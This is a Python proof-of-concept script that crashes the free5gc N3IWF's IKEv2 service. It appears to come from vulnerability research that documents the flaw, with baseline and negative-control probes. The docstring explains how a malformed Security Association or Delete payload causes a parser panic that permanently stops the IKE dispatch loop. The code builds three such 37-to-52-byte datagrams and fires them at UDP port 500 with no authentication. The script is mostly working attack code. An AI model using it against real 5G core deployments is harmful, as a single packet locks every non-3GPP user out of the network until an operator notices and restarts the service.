#!/usr/bin/env python3
"""
ike_dos.py -- F34 / N1-N3: pre-authentication IKEv2 parser DoS against
              free5gc N3IWF (github.com/free5gc/ike v1.2.1).

VULNERABILITY
  github.com/free5gc/ike message/payload_securityassociation.go:181

      172  spiSize := b[6]
      173  if spiSize > 0 {
      175      if len(b) < int(8+spiSize) { return errors.Errorf(...) }  // checks len(b), NOT proposalLength
      178      proposal.SPI = append(proposal.SPI, b[8:8+spiSize]...)
      179  }
      181  transformData = b[8+spiSize : proposalLength]   // PANIC: low > high

  `proposalLength` is only validated as `>= 8` and `<= len(b)`.  Nothing relates it
  to `spiSize`, so a proposal declaring ProposalLength=8 with SPISize=4 makes the
  slice expression `b[12:8]` and panics with "slice bounds out of range [12:8]".

  Two sibling defects are included because they share the exact same consequence:
    CASE A2 -- same bug, reached with a well-formed 1st proposal + truncated 2nd
    CASE B  -- message/payload_delete.go:60-61, `for i := 0; i < len(b); i += 4`
               with no residue check -> b[0:4] on a cap-1 slice

WHY IT IS A PERMANENT OUTAGE AND NOT JUST A LOGGED ERROR
  free5gc/n3iwf internal/ike/server.go:107-141.  The `recover()` at :110 lives in
  the deferred function of the single `server()` goroutine itself, so recovering a
  panic *ends* the for-select loop at :124.  The defer then runs:

      114  ikeLog.Infof("Ike server stopped")
      115  s.rcvPktCh.Close()
      116  s.rcvEvtCh.Close()
      117  close(s.StopServer)
      118  wg.Done()

  The two UDP receivers (:143) keep calling ReadFromUDP and SafeCh.Send, but nobody
  drains rcvPktCh any more.  Result: the N3IWF process stays alive, the container
  stays `Up` with RestartCount=0, no healthcheck fires -- and every non-3GPP UE is
  silently locked out until someone restarts the container.

  `checkIKEMessage` is called inline at :127, i.e. *outside* any per-message
  goroutine, so a parse panic cannot be contained to one request.

ATTACK SURFACE
  One UDP datagram to port 500.  No IKE SA, no certificate, no credential, no prior
  exchange, no reachable UE.  Path:
      server.go:172  ReadFromUDP
      server.go:195  len(msgBuf) < IKE_HEADER_LEN gate (28) -- 44 bytes passes
      server.go:206  rcvPktCh.Send
      server.go:127  checkIKEMessage
      server.go:293  ExchangeType == IKE_SA_INIT
      server.go:294  ike.DecodeDecrypt(msg, hdr, nil, Role_Responder)
      ike.go:46      DecodePayload
      message.go:181 Unmarshal
      payload_securityassociation.go:181  <-- PANIC

LIVENESS PROBE (the core of the evidence)
  `server.go:299-317` answers an INFORMATIONAL message carrying an unknown
  ResponderSPI with an INVALID_IKE_SPI notification, *before* any crypto is
  attempted.  That gives a deterministic, zero-negotiation probe of whether the
  `server()` goroutine is alive:

      probe answered  -> IKE dispatch loop is running
      probe unanswered -> IKE dispatch loop is dead

  A full, well-formed IKE_SA_INIT probe (--sainit-probe) is also available; it
  additionally proves the real attach path works before the attack.

USAGE
  # 1. baseline + attack + post-attack liveness (the whole proof in one shot)
  python3 ike_dos.py --target 10.100.200.15 --port 500 --mode full --case A

  # 2. negative control: same probes, no malformed packet, repeated
  python3 ike_dos.py --target 10.100.200.15 --mode control --control-probes 200

  # 3. just fire the malformed datagram
  python3 ike_dos.py --target 10.100.200.15 --mode attack --case B

Exit codes: 0 = IKE killed (vulnerable), 1 = IKE survived (not vulnerable),
            2 = could not establish a baseline (test inconclusive).
"""

import argparse
import binascii
import os
import socket
import struct
import sys
import time

# ---------------------------------------------------------------- constants
# free5gc/ike message/types.go
IKE_HEADER_LEN = 28
NoNext, TypeSA, TypeKE = 0, 33, 34
TypeNiNr, TypeN, TypeD, TypeSK = 40, 41, 42, 46

# message/types.go:135-138  (iota + 34)
IKE_SA_INIT, IKE_AUTH, CREATE_CHILD_SA, INFORMATIONAL = 34, 35, 36, 37

# message/types.go:58-64 transform types
TT_ENCR, TT_PRF, TT_INTEG, TT_DH, TT_ESN = 1, 2, 3, 4, 5

# transform IDs the deployed n3iwf accepts (security/{encr,prf,integ,dh}/*.go init())
ENCR_AES_CBC = 12            # requires AttributeTypeKeyLength(14) = 128/192/256
PRF_HMAC_SHA2_256 = 5
AUTH_HMAC_SHA2_256_128 = 12
DH_2048_BIT_MODP = 14
ATTR_KEY_LENGTH = 14

DEFAULT_ISPI = 0x1122334455667788
UNKNOWN_RSPI = 0xDEADBEEFCAFEBAB0   # deliberately not an allocated responder SPI


# ---------------------------------------------------------------- builders
def ike_header(next_payload, exchange_type, flags, msg_id, ispi, rspi, payload=b""):
    """RFC 7296 3.1 IKE header (28 bytes) + payload."""
    h = bytearray(IKE_HEADER_LEN)
    struct.pack_into(">Q", h, 0, ispi)
    struct.pack_into(">Q", h, 8, rspi)
    h[16] = next_payload & 0xFF
    h[17] = 0x20                      # MajorVersion 2, MinorVersion 0
    h[18] = exchange_type & 0xFF
    h[19] = flags & 0xFF
    struct.pack_into(">I", h, 20, msg_id & 0xFFFFFFFF)
    struct.pack_into(">I", h, 24, IKE_HEADER_LEN + len(payload))
    return bytes(h) + payload


def generic_payload(next_payload, critical, body):
    """RFC 7296 3.2 generic payload header (4 bytes) + body."""
    g = bytearray(4)
    g[0] = next_payload & 0xFF
    g[1] = 0x80 if critical else 0x00
    struct.pack_into(">H", g, 2, 4 + len(body))
    return bytes(g) + body


def case_a(ispi=DEFAULT_ISPI):
    """
    SA payload, ONE proposal with ProposalLength(8) < 8 + SPISize(4).
      payload_securityassociation.go:181 -> b[12:8]
    The :175 guard tests len(b) (whole remaining buffer, incl. trailing bytes)
    instead of proposalLength, so it does not fire.  44 bytes total.
    """
    proposal = bytes([
        0x00, 0x00, 0x00, 0x08,   # last proposal, reserved, Proposal Length = 8
        0x01,                     # Proposal Num = 1
        0x01,                     # Protocol ID  = 1 (IKE)
        0x04,                     # SPI Size     = 4   <-- 8+4 = 12 > 8
        0x00,                     # # Transforms = 0
    ]) + b"DEAD"                  # 4 bytes of "SPI" + slack so len(b) >= 12
    sa = generic_payload(NoNext, True, proposal)      # 4 + 12 = 16
    return ike_header(TypeSA, IKE_SA_INIT, 0x08, 0, ispi, 0, sa)


def case_a2(ispi=DEFAULT_ISPI):
    """
    Same root cause, no trailing-slack trick: a well-formed 8-byte proposal #1
    (SPISize 0, 0 transforms) followed by proposal #2 declaring
    ProposalLength=8 with SPISize=4.  52 bytes total.
    """
    p1 = bytes([0x02, 0x00, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00])
    p2 = bytes([0x00, 0x00, 0x00, 0x08, 0x02, 0x01, 0x04, 0x00]) + b"XXXX"
    sa = generic_payload(NoNext, True, p1 + p2)       # 4 + 20 = 24
    return ike_header(TypeSA, IKE_SA_INIT, 0x08, 0, ispi, 0, sa)


def case_b(ispi=DEFAULT_ISPI):
    """
    Delete payload whose body length is not a multiple of 4.
      payload_delete.go:60-61  for i := 0; i < len(b); i += 4 { ... b[i:i+4] }
    Reached with SPISize=0 / NumberOfSPIs=0 plus 1 trailing byte, which passes both
    guards at :50 (len(b) >= 4 + 0*0).  Only panics because server.go:178-179
    copies exactly n bytes into a fresh buffer, so len(msg) == cap(msg).  37 bytes.
    """
    body = bytes([
        0x01,         # Protocol ID = 1 (IKE)
        0x00,         # SPI Size    = 0
        0x00, 0x00,   # Number of SPIs = 0
        0x41,         # one trailing byte -> len(b[4:]) == 1, not a multiple of 4
    ])
    dele = generic_payload(NoNext, True, body)        # 4 + 5 = 9
    return ike_header(TypeD, IKE_SA_INIT, 0x08, 0, ispi, 0, dele)


def transform(ttype, tid, attr=None, last=False):
    """RFC 7296 3.3.2 Transform."""
    t = bytearray(8)
    t[0] = 0x00 if last else 0x03   # 0 = last, 3 = more
    t[4] = ttype & 0xFF
    struct.pack_into(">H", t, 6, tid)
    out = bytes(t)
    if attr is not None:
        atype, aval = attr
        # AttributeFormat=1 (TV) in the top bit, per Marshal at
        # payload_securityassociation.go:123-125
        out += struct.pack(">HH", (1 << 15) | atype, aval)
    out = bytearray(out)
    struct.pack_into(">H", out, 2, len(out))
    return bytes(out)


def valid_ike_sa_init(ispi=None):
    """
    A complete, well-formed IKE_SA_INIT that the deployed N3IWF accepts:
      ENCR_AES_CBC_128 (key-length attribute 128) + PRF_HMAC_SHA2_256 +
      AUTH_HMAC_SHA2_256_128 + DH_2048_BIT_MODP.
    SelectProposal (internal/ike/handler.go:2037) treats DH, ENCR, INTEG and PRF
    as mandatory, so all four must be present.
    """
    if ispi is None:
        ispi = int.from_bytes(os.urandom(8), "big") | (1 << 63)
    transforms = (
        transform(TT_ENCR, ENCR_AES_CBC, attr=(ATTR_KEY_LENGTH, 128)) +
        transform(TT_PRF, PRF_HMAC_SHA2_256) +
        transform(TT_INTEG, AUTH_HMAC_SHA2_256_128) +
        transform(TT_DH, DH_2048_BIT_MODP, last=True)
    )
    prop = bytearray(8)
    prop[0] = 0x00        # last proposal
    prop[4] = 0x01        # Proposal Num
    prop[5] = 0x01        # Protocol ID = IKE
    prop[6] = 0x00        # SPI Size = 0
    prop[7] = 0x04        # 4 transforms
    prop += transforms
    struct.pack_into(">H", prop, 2, len(prop))

    sa = generic_payload(TypeKE, False, bytes(prop))
    # KE payload: DH Group#(2) | RESERVED(2) | Key Exchange Data(256 for 2048-bit)
    ke_body = struct.pack(">HH", DH_2048_BIT_MODP, 0) + os.urandom(256)
    ke = generic_payload(TypeNiNr, False, ke_body)
    nonce = generic_payload(NoNext, False, os.urandom(32))

    return ike_header(TypeSA, IKE_SA_INIT, 0x08, 0, ispi, 0, sa + ke + nonce)


def liveness_probe(rspi=UNKNOWN_RSPI, ispi=DEFAULT_ISPI):
    """
    A bare 28-byte INFORMATIONAL with an unallocated ResponderSPI.
    server.go:304 IKESALoad(localSPI) fails -> :308 BuildNotification(INVALID_IKE_SPI)
    -> :312 SendIKEMessageToUE.  No DecodeDecrypt, no crypto, fully deterministic.
    """
    return ike_header(NoNext, INFORMATIONAL, 0x08, 0, ispi, rspi)


def describe_reply(data):
    """Best-effort one-line description of an IKE reply, for the evidence log."""
    if data is None:
        return "NO RESPONSE (timeout)"
    if len(data) < IKE_HEADER_LEN:
        return "short reply (%d bytes)" % len(data)
    rspi = struct.unpack(">Q", data[0:8])[0]
    exch = data[18]
    np = data[16]
    total = struct.unpack(">I", data[24:28])[0]
    names = {34: "IKE_SA_INIT", 35: "IKE_AUTH", 36: "CREATE_CHILD_SA",
             37: "INFORMATIONAL"}
    return ("%d bytes, ExchangeType=%s(%d), NextPayload=%d, ResponderSPI=0x%016x, "
            "TotalLength=%d" % (len(data), names.get(exch, "?"), exch, np, rspi, total))


# ---------------------------------------------------------------- transport
def make_sock(target, port, src_port=0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", src_port))
    s.connect((target, port))
    return s


def send_recv(sock, pkt, timeout):
    """sock is already connect()ed to the target, so send()/recv() are used."""
    sock.settimeout(timeout)
    sock.send(pkt)
    t0 = time.time()
    try:
        data = sock.recv(65535)
        return data, time.time() - t0
    except socket.timeout:
        return None, time.time() - t0


def probe_once(target, port, timeout, tag=""):
    """One liveness probe. Returns (answered: bool, rtt: float, desc: str)."""
    s = make_sock(target, port)
    try:
        pkt = liveness_probe()
        data, rtt = send_recv(s, pkt, timeout)
        desc = describe_reply(data)
        print("[probe%s] %s  rtt=%.3fs  %s" % (tag, "ANSWERED " if data else "SILENT   ",
                                               rtt, desc))
        return data is not None, rtt, desc
    finally:
        s.close()


def sainit_probe(target, port, timeout, tag=""):
    """Full well-formed IKE_SA_INIT -- proves the real attach path works."""
    s = make_sock(target, port)
    try:
        pkt = valid_ike_sa_init()
        print("[sainit%s] sending %d-byte well-formed IKE_SA_INIT" % (tag, len(pkt)))
        data, rtt = send_recv(s, pkt, timeout)
        desc = describe_reply(data)
        print("[sainit%s] %s  rtt=%.3fs  %s" % (tag, "ANSWERED " if data else "SILENT   ",
                                                rtt, desc))
        return data is not None, rtt, desc
    finally:
        s.close()


def fire_attack(target, port, case, ispi=DEFAULT_ISPI, timeout=2.0):
    """Send the malformed datagram. No reply is expected for any of these cases."""
    builders = {"A": case_a, "A2": case_a2, "B": case_b}
    pkt = builders[case](ispi)
    s = make_sock(target, port)
    try:
        print("[attack] CASE %s -> %d bytes to %s:%d/udp" % (case, len(pkt), target, port))
        print("[attack] hex: %s" % binascii.hexlify(pkt).decode())
        s.settimeout(timeout)
        s.send(pkt)
        try:
            data = s.recv(65535)
            print("[attack] unexpected reply: %s" % describe_reply(data))
        except socket.timeout:
            print("[attack] no reply (expected: the panic aborts the dispatch loop "
                  "before any response is built)")
        return pkt
    finally:
        s.close()


# ---------------------------------------------------------------- modes
def mode_full(args):
    print("=" * 78)
    print("F34/N1 pre-auth IKE parser DoS -- full sequence")
    print("target %s:%d/udp   case %s   timeout %.2fs" %
          (args.target, args.port, args.case, args.timeout))
    print("=" * 78)

    print("\n--- PHASE 1: baseline liveness (IKE dispatch loop must be ALIVE) ---")
    base_ok = False
    for i in range(args.baseline_probes):
        ok, _, _ = probe_once(args.target, args.port, args.timeout, tag="-base%d" % i)
        base_ok = base_ok or ok
        time.sleep(args.gap)
    if not base_ok:
        print("\nBASELINE FAILED: the N3IWF did not answer any liveness probe.")
        print("Is the IKE service running on %s:%d/udp? Test inconclusive." %
              (args.target, args.port))
        return 2
    print("baseline: ANSWERED -> IKE dispatch loop alive")

    if args.sainit_probe:
        print("\n--- PHASE 1b: well-formed IKE_SA_INIT (real attach path) ---")
        sainit_probe(args.target, args.port, args.timeout, tag="-base")

    print("\n--- PHASE 2: attack ---")
    attack_pkt = b""
    for i in range(args.attacks):
        attack_pkt = fire_attack(args.target, args.port, args.case, timeout=args.timeout)
        time.sleep(args.gap)

    print("\n--- PHASE 3: post-attack liveness (expect SILENT = permanent outage) ---")
    time.sleep(args.settle)
    post_ok = False
    for i in range(args.post_probes):
        ok, _, _ = probe_once(args.target, args.port, args.timeout, tag="-post%d" % i)
        post_ok = post_ok or ok
        time.sleep(args.gap)

    if args.sainit_probe:
        print("\n--- PHASE 3b: well-formed IKE_SA_INIT after the attack ---")
        sainit_probe(args.target, args.port, args.timeout, tag="-post")

    print("\n" + "=" * 78)
    if post_ok:
        print("RESULT: IKE still answering -> NOT VULNERABLE (or patch present)")
        print("=" * 78)
        return 1
    print("RESULT: baseline ANSWERED, post-attack SILENT")
    print("        -> the IKE dispatch goroutine is permanently dead.")
    print("        -> one %d-byte unauthenticated UDP datagram removed the entire"
          % (len(attack_pkt) or len(case_a())))
    print("           non-3GPP control plane. The process is still running; only a")
    print("           container restart restores service.")
    print("=" * 78)
    return 0


def mode_control(args):
    print("=" * 78)
    print("F34/N1 NEGATIVE CONTROL -- %d benign probes, no malformed packet"
          % args.control_probes)
    if args.control_sainit_every:
        print("  interleaving a well-formed IKE_SA_INIT every %d probes"
              % args.control_sainit_every)
    print("target %s:%d/udp   timeout %.2fs" % (args.target, args.port, args.timeout))
    print("=" * 78)
    print("WHY THIS CONTROL IS THE RIGHT ONE: a well-formed IKE_SA_INIT exercises")
    print("the *identical* code path as the attack -- DecodeDecrypt -> DecodePayload")
    print("-> SecurityAssociation.Unmarshal, the very function that panics at")
    print("payload_securityassociation.go:181 -- but with a Proposal Length that is")
    print("consistent with SPI Size.  If volume or repeated parsing were the cause,")
    print("this control would also kill the loop.  It does not.")
    answered = 0
    silent = 0
    sainit_ok = 0
    sainit_bad = 0
    for i in range(args.control_probes):
        ok, _, _ = probe_once(args.target, args.port, args.timeout, tag="-%d" % i)
        if ok:
            answered += 1
        else:
            silent += 1
        if args.control_sainit_every and (i + 1) % args.control_sainit_every == 0:
            sok, _, _ = sainit_probe(args.target, args.port, args.timeout,
                                     tag="-ctl%d" % i)
            if sok:
                sainit_ok += 1
            else:
                sainit_bad += 1
        time.sleep(args.gap)
        if (i + 1) % 25 == 0:
            print("  ... %d/%d probes, answered=%d silent=%d sainit_ok=%d sainit_bad=%d"
                  % (i + 1, args.control_probes, answered, silent,
                     sainit_ok, sainit_bad))
    print("\n" + "=" * 78)
    print("CONTROL RESULT: probes answered=%d silent=%d of %d"
          % (answered, silent, args.control_probes))
    print("                well-formed IKE_SA_INITs answered=%d silent=%d"
          % (sainit_ok, sainit_bad))
    if silent == 0 and sainit_bad == 0:
        print("  -> benign IKE traffic alone never kills the dispatch loop,")
        print("     including traffic that walks the exact panicking function.")
        print("     The outage in --mode full is caused by the malformed")
        print("     ProposalLength/SPISize relationship, not by probe volume.")
        print("=" * 78)
        return 0
    print("  -> some benign traffic went unanswered; control is NOT clean.")
    print("=" * 78)
    return 1


def main():
    p = argparse.ArgumentParser(
        description="free5gc N3IWF pre-auth IKEv2 parser DoS (F34 / N1-N3)")
    p.add_argument("--target", default="10.100.200.15",
                   help="N3IWF IKE address (n3iwfcfg.yaml ikeBindAddress)")
    p.add_argument("--port", type=int, default=500, help="IKE UDP port (default 500)")
    p.add_argument("--mode", default="full",
                   choices=["full", "control", "attack", "probe", "sainit"],
                   help="full=baseline+attack+post (default), control=benign only, "
                        "attack=fire only, probe=one liveness probe, "
                        "sainit=one well-formed IKE_SA_INIT")
    p.add_argument("--case", default="A", choices=["A", "A2", "B"],
                   help="A=SA ProposalLength<8+SPISize (default), A2=two proposals, "
                        "B=Delete body length %% 4 != 0")
    p.add_argument("--timeout", type=float, default=3.0,
                   help="per-probe response timeout in seconds")
    p.add_argument("--baseline-probes", type=int, default=3)
    p.add_argument("--post-probes", type=int, default=8)
    p.add_argument("--attacks", type=int, default=1)
    p.add_argument("--control-probes", type=int, default=200)
    p.add_argument("--control-sainit-every", type=int, default=0,
                   help="in control mode, send a well-formed IKE_SA_INIT every N "
                        "probes (exercises the same parse path with valid input)")
    p.add_argument("--gap", type=float, default=0.15, help="delay between packets")
    p.add_argument("--settle", type=float, default=1.0,
                   help="wait after the attack before post-probing")
    p.add_argument("--sainit-probe", action="store_true",
                   help="also send a full well-formed IKE_SA_INIT in phases 1 and 3")
    args = p.parse_args()

    if args.mode == "full":
        return mode_full(args)
    if args.mode == "control":
        return mode_control(args)
    if args.mode == "attack":
        fire_attack(args.target, args.port, args.case, timeout=args.timeout)
        return 0
    if args.mode == "probe":
        ok, _, _ = probe_once(args.target, args.port, args.timeout)
        return 0 if ok else 1
    if args.mode == "sainit":
        ok, _, _ = sainit_probe(args.target, args.port, args.timeout)
        return 0 if ok else 1
    return 2


if __name__ == "__main__":
    sys.exit(main())
